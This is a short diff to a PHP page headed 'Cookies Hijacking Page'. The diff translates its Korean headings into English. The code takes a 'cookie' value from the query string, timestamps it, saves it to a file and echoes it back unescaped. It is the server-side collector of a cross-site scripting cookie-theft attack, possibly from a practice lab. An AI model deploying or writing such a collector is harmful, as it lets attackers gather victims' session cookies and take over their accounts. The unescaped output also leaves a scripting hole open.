@@ -1,6 +1,6 @@
 <html>
 <body>
-<h1>웰플 사과 쿠키 탈취 페이지 </h1>
+<h1>Cookies Hijacking Page</h1>
 <?php
 $cookie=$_GET[cookie];
 $now = date("Y-m-d-h-i-s");
@@ -12,7 +12,7 @@ if(strlen($cookie) >2) {
 	fclose($save_file);
 }
 ?>
-<h3>현재 쿠키 값 : </h3>
+<h3>Cookie value  of this session : </h3>
 <p><?php echo $cookie; ?></p>
 <br>
 	<?php
